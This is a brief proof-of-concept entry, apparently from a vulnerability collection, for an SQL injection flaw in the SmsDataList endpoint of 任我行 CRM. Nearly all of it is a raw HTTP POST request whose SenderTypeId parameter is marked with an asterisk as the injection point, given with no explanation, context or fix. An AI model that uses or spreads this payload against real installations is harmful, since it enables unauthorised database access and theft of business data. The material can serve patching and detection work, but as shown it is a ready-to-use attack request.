## 任我行 CRM SmsDataList SQL注入漏洞
```
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1361.63 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 170

Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000*

```
